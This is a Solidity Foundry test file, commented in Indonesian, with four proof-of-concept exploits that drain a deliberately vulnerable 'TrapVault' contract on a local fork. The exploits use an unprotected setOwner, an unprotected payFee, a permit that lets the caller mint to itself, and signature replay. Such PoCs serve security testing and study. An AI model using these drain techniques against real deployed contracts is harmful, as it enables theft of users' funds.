// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "trapvault/trap-vault.sol";

/// @title PoC fork-lokal TrapVault — rekomendasi Kiro Opus 5.5 (sesi 20:38 WIB 2026-11-13)
/// @notice Satu file test untuk 4 kandidat: #2 setOwner, #7 payFee,
///         A permit self-mint, B replay signature. Semua jalan di fork
///         lokal (forge in-process), TANPA mainnet, TANPA wallet nyata.
/// @dev Jalankan: cd poc && forge test -vv
contract TrapVaultPoC is Test {
    TrapVault vault;
    uint256 ownerPk = 0xA11CE;
    address owner;
    address user = address(0xBEEF);

    function setUp() public {
        owner = vm.addr(ownerPk);
        vm.prank(owner);
        vault = new TrapVault();
        // Vault didanai 10 ETH + user deposit 5 ETH (total 15 ETH).
        vm.deal(address(vault), 10 ether);
        vm.deal(user, 5 ether);
        vm.prank(user);
        vault.deposit{value: 5 ether}();
    }

    // #2 — setOwner tanpa kontrol akses -> emergencyDrain kuras vault.
    function test_PoC2_SetOwnerDrain() public {
        address attacker = address(0xA77A);
        vm.prank(attacker);
        vault.setOwner(attacker);
        assertEq(vault.owner(), attacker);
        uint256 beforeBal = attacker.balance;
        // prank 2-arg: set msg.sender DAN tx.origin (emergencyDrain cek tx.origin).
        vm.prank(attacker, attacker);
        vault.emergencyDrain();
        assertEq(address(vault).balance, 0);
        assertEq(attacker.balance, beforeBal + 15 ether);
    }

    // #7 — payFee tanpa kontrol akses -> kirim seluruh saldo ke alamat mana pun.
    function test_PoC7_PayFeeDrain() public {
        address attacker = address(0xA77A);
        uint256 bal = address(vault).balance;
        vault.payFee(attacker, bal);
        assertEq(address(vault).balance, 0);
        assertEq(attacker.balance, bal);
    }

    // A — permitRegexControl: caller isi owner = dirinya, tanda tangan
    // digest dengan key sendiri, cetak saldo arbitrer, lalu tarik isi vault.
    function test_PoCA_PermitSelfMint() public {
        uint256 attackerPk = 0xA77A;
        address atk = vm.addr(attackerPk);
        uint256 value = 1000 ether;
        uint256 deadline = block.timestamp + 1 days;
        bytes32 digest = keccak256(abi.encodePacked(atk, atk, value, deadline));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(attackerPk, digest);
        vault.permitRegexControl(atk, atk, value, deadline, v, r, s);
        assertEq(vault.balances(atk), value);
        vm.prank(atk);
        vault.withdrawSafe(address(vault).balance);
        assertEq(address(vault).balance, 0);
    }

    // B — replay: satu signature owner untuk (user, 1 ether) dipakai 2x.
    function test_PoCB_ReplaySignature() public {
        uint256 amount = 1 ether;
        bytes32 h = keccak256(abi.encodePacked(user, amount));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(ownerPk, h);
        vm.prank(user);
        vault.claimWithSignature(amount, v, r, s);
        vm.prank(user);
        vault.claimWithSignature(amount, v, r, s);
        assertEq(vault.balances(user), 5 ether + 2 * amount);
    }
}
